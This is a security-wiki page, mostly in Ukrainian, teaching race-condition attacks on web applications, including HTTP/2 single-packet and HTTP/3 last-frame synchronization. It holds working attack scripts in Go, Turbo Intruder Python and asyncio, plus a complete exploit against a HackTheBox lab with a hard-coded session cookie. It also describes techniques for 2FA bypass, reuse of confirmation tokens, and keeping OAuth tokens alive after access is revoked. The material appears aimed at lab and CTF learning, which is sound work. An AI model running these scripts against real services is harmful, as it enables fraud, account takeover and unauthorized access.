# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Щоб отримати глибоке розуміння цієї техніки, перегляньте оригінальний звіт у [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Головна перешкода при використанні race conditions — забезпечити обробку кількох запитів одночасно, з **дуже малою різницею у часі їх обробки — бажано менше 1ms**.

Тут наведені деякі методи для синхронізації запитів:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Підтримує відправлення двох запитів через одне TCP-з'єднання, що зменшує вплив мерехтіння мережі. Проте через варіації на стороні сервера двох запитів може бути недостатньо для послідовного експлойту race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Дозволяє попередньо відправити більшість частин 20–30 запитів, утримуючи невеликий фрагмент, який потім надсилається разом, забезпечуючи одночасне надходження на сервер.

Підготовка до Last-Byte Sync включає:

1. Відправлення заголовків і даних тіла за вирахуванням останнього байта без завершення потоку.
2. Пауза 100ms після початкової відправки.
3. Вимкнення TCP_NODELAY, щоб використати алгоритм Nagle для пакетування фінальних фреймів.
4. Виконання ping для прогріву з'єднання.

Подальша відправка утриманих фреймів має призвести до їхнього надходження в одному пакеті, що можна перевірити у Wireshark. Цей метод не застосовується до static files, які зазвичай не залучені в RC attacks.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 працює поверх QUIC (UDP). Тут немає TCP coalescing або Nagle, на які можна було б покластись, тому класичний last‑byte sync не працює з off‑the‑shelf клієнтами. Натомість потрібно навмисно зкоалесціювати кілька QUIC stream‑final DATA фреймів (FIN) в один і той же UDP датаграм, щоб сервер обробив усі цільові запити в одному такті планувальника.
- **How to do it**: Використовуйте спеціальну бібліотеку, яка дає контроль над QUIC фреймами. Наприклад, H3SpaceX маніпулює quic-go, щоб реалізувати HTTP/3 last‑frame synchronization як для requests with a body, так і для GET‑style requests без тіла.
- Requests‑with‑body: відправте HEADERS + DATA за вирахуванням останнього байта для N потоків, потім flush фінальний байт кожного потоку разом.
- GET‑style: сформуйте фейкові DATA фрейми (або невелике тіло з Content‑Length) і заверште всі потоки в одному датаграмі.
- **Practical limits**:
  - Кількість одночасних потоків обмежена транспортним параметром peer’а QUIC max_streams (аналогічно HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). Якщо він малий, відкрийте кілька H3-з'єднань і розподіліть race між ними.
  - Розмір UDP датаграми та path MTU обмежують, скільки stream‑final фреймів ви можете зкоалесціювати. Бібліотека бере на себе розбиття на кілька датаграм за потреби, але single‑datagram flush є найнадійнішим.
- **Practice**: Існують публічні H2/H3 race labs та приклади експлойтів, що супроводжують H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) мінімальний приклад</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Adapting to Server Architecture

Розуміння архітектури цілі критично важливе. Фронтенд-сервери можуть маршрутизувати запити по-різному, що впливає на таймінги. Попереднє прогрівання з'єднання на стороні сервера через несуттєві запити може вирівняти таймінги запитів.

#### Handling Session-Based Locking

Фреймворки, такі як PHP's session handler, серіалізують запити по сесії, що потенційно приховує вразливості. Використання різних session tokens для кожного запиту може обійти цю проблему.

#### Overcoming Rate or Resource Limits

Якщо прогрівання з'єднання неефективне, навмисне спричинення затримок через обмеження швидкості або ресурсів вебсерверів шляхом потоку фіктивних запитів може полегшити single-packet attack, створивши затримку на стороні сервера, сприятливу для race conditions.

## Attack Examples

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Якщо ви збираєтеся **відправляти різні значення**, ви можете змінити код на варіант, який використовує wordlist з буфера обміну:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Якщо сайт не підтримує HTTP2 (лише HTTP1.1), використовуйте `Engine.THREADED` або `Engine.BURP` замість `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Якщо потрібно відправити запит на 1 endpoint, а потім кілька на інші endpoints, щоб викликати RCE, ви можете змінити скрипт `race-single-packet-attack.py` приблизно так:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Це також доступно в **Repeater** через нову опцію '**Send group in parallel**' у Burp Suite.
- Для **limit-overrun** ви можете просто додати в групу **той самий запит 50 разів**.
- Для **connection warming** ви можете **додати** на **початку** **групи** кілька **запитів** до нестатичної частини веб‑сервера.
- Для **delaying** процесу **між** обробкою **одного запиту та іншого** у двоетапному підході ви можете **додати додаткові запити між** обома запитами.
- Для **multi-endpoint** RC ви можете почати надсилати **запит**, який **переходить у прихований стан**, а потім одразу **50 запитів**, що **експлуатують прихований стан**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Мета цього скрипта — змінити email користувача, постійно перевіряючи його, поки verification token нового email не надійде на останній email (це тому, що в коді було виявлено RC, де можна змінити email, але підтвердження відправлялося на старий, тому що змінна, що вказує email, уже була заповнена першим).\
Коли в отриманих листах знаходять слово "objetivo", ми знаємо, що отримали verification token зміненого email і припиняємо атаку.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: чергуйте багато копій із `gate='race1'` (або gates для кожної спроби), що затримує хвіст кожного запиту; `openGate('race1')` скидає всі хвости разом так, щоб вони прибули майже одночасно.
- Diagnostics: negative timestamps in Turbo Intruder вказують, що сервер відповів до того, як запит було повністю відправлено, що доводить накладання. Це очікувано у справжніх races.
- Connection warming: відправте спочатку ping або кілька нешкідливих запитів, щоб стабілізувати таймінги; за бажання можна вимкнути `TCP_NODELAY`, щоб заохотити пакетизацію фінальних фреймів.


### Покращення Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**цьому дописі**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it було пояснено, як можна розширити обмеження в 1,500 байт single packet attack до **65,535 B window limitation of TCP** використовуючи IP layer fragmentation (розбивку одного пакета на кілька IP-пакетів) і відправляючи їх у різному порядку, що дозволяє запобігти реасемблюванню пакета, поки всі фрагменти не досягнуть сервера. Ця техніка дозволила досліднику відправити 10,000 запитів приблизно за 166ms.

Зверніть увагу, що хоч це покращення робить атаку більш надійною для RC, які вимагають сотень/тисяч пакетів, що прибувають одночасно, воно також може мати програмні обмеження. Деякі популярні HTTP servers як Apache, Nginx та Go мають суворе налаштування `SETTINGS_MAX_CONCURRENT_STREAMS` зі значеннями 100, 128 і 250 відповідно. Однак інші, як NodeJS і nghttp2, мають його необмеженим.\
Це по суті означає, що Apache буде розглядати лише 100 HTTP connections з одного TCP connection (що обмежує цю RC-атаку). Для HTTP/3 аналогічне обмеження — transport parameter QUIC’s max_streams — якщо воно мале, розподіліть race між кількома QUIC connections.

Деякі приклади використання цієї техніки можна знайти в репозиторії [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Перегляньте приклади з попереднього розділу.
- **Intruder**: Надішліть **request** у **Intruder**, встановіть **number of threads** на **30** в **Options menu**, оберіть як payload **Null payloads** і згенеруйте **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Це найпростіший тип race condition, коли **vulnerabilities** виникають у місцях, що **обмежують кількість виконань дії**. Наприклад, використання одного й того самого discount code у веб-магазині кілька разів. Дуже простий приклад можна знайти в [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) або в [**this bug**](https://hackerone.com/reports/759247)**.**

Існує багато варіацій такого роду атак, зокрема:

- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balance
- Reusing a single CAPTCHA solution
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

Експлуатація складних race conditions часто вимагає використання коротких вікон можливості взаємодії з прихованими або **непередбаченими machine substates**. Ось як підходити до цього:

1. **Identify Potential Hidden Substates**
- Почніть з визначення endpoint-ів, що модифікують або взаємодіють з критичними даними, наприклад профілями користувачів або процесом password reset. Звертайте увагу на:
- **Storage**: Віддавайте перевагу endpoint-ам, що працюють із server-side persistent data, а не тим, що обробляють дані на клієнті.
- **Action**: Шукайте операції, які змінюють існуючі дані — вони частіше створюють exploitable conditions, ніж ті, що додають нові записи.
- **Keying**: Успішні атаки зазвичай використовують операції, keyed на той самий ідентифікатор, наприклад username або reset token.
2. **Conduct Initial Probing**
- Протестуйте виявлені endpoints на race condition атаки, спостерігаючи відхилення від очікуваної поведінки. Несподівані відповіді або зміни в поведінці застосунку можуть сигналізувати про вразливість.
3. **Demonstrate the Vulnerability**
- Зведіть атаку до мінімальної кількості запитів, необхідних для експлуатації вразливості, часто це лише два запити. Цей етап може вимагати багато спроб або автоматизації через дуже точне синхронування.

### Time Sensitive Attacks

Точність у часі запитів може виявити вразливості, особливо коли для security tokens використовуються передбачувані методи на кшталт timestamps. Наприклад, генерація password reset tokens на основі timestamps може дозволити ідентичні токени для одночасних запитів.

**To Exploit:**

- Використовуйте точне синхронізування, наприклад атаку одним пакетом, щоб зробити concurrent password reset requests. Ідентичні tokens вказують на вразливість.

**Example:**

- Запросіть два password reset tokens одночасно і порівняйте їх. Якщо токени співпадають — це вказує на проблему в token generation.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **щоб спробувати це.**

## Hidden substates case studies

### Pay & add an Item

Перегляньте цей [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), щоб побачити, як **pay** у магазині й **add an extra** item, за який **you won't need to pay for it**.

### Confirm other emails

Ідея — **verify an email address and change it to a different one at the same time**, щоб дізнатися, чи платформа підтверджує нову адресу, що була змінена.

### Change email to 2 emails addresses Cookie based

Згідно з [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab був вразливий до takeover таким чином, оскільки він міг **send** the **email verification token of one email to the other email**.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **щоб спробувати це.**

### Hidden Database states / Confirmation Bypass

Якщо для додавання інформації в **database** використовуються **2 different writes**, існує короткий період, коли **only the first data has been written** в database. Наприклад, при створенні користувача username і password можуть бути записані, а потім записується token для підтвердження щойно створеного облікового запису. Це означає, що протягом невеликого часу token to confirm an account може бути null.

Тому реєстрація облікового запису і відправка кількох запитів з порожнім token (`token=` або `token[]=` або будь-яка інша варіація) для негайного підтвердження облікового запису може дозволити **підтвердити обліковий запис**, до якого ви не контролюєте email.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **щоб спробувати це.**

### Bypass 2FA

Наступний pseudo-code вразливий до race condition, тому що у дуже короткий проміжок часу **2FA is not enforced**, поки створюється session:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 вічна персистентність

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ці сервіси дозволяють створити додаток і аутентифікувати користувачів, яких зареєстрував провайдер. Для цього **client** має **permit your application** доступ до частини їхніх даних всередині **OAUth provider**.\
Отже, поки що — звичайний вхід через google/linkedin/github..., коли вам показує сторінку з повідомленням: "_Application <InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Проблема з'являється, коли ви **accept it** — провайдер автоматично надсилає **`authorization_code`** до зловмисного додатку. Далі цей додаток зловживає Race Condition у OAUth service provider, щоб згенерувати більше ніж один AT/RT (_Authentication Token/Refresh Token_) з того самого `authorization_code` для вашого акаунта. По суті, він користується тим, що ви дозволили додатку доступ до ваших даних, щоб **create several accounts**. Якщо ви **stop allowing the application to access your data**, одна пара AT/RT буде видалена, але інші все одно залишаться дійсними.

#### Race Condition in `Refresh Token`

Отримавши дійсний RT, ви можете намагатися зловживати ним, щоб згенерувати кілька AT/RT, і навіть якщо користувач скасовує дозволи для зловмисного додатку на доступ до своїх даних, кілька RT все одно залишатимуться дійсними.

## **RC in WebSockets**

- У [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) можна знайти PoC на Java для відправки websocket-повідомлень **parallel** з метою експлуатації **Race Conditions also in Web Sockets**.
- За допомогою Burp’s WebSocket Turbo Intruder можна використовувати рушій **THREADED** для створення кількох WS-з'єднань і відправки payloads паралельно. Почніть з офіційного прикладу та налаштуйте `config()` (thread count) для досягнення потрібної конкуренції; це часто надійніше, ніж пакетна відправка на одному з'єднанні при змаганні за стан на стороні сервера між WS handlers. Див. [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Посилання

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
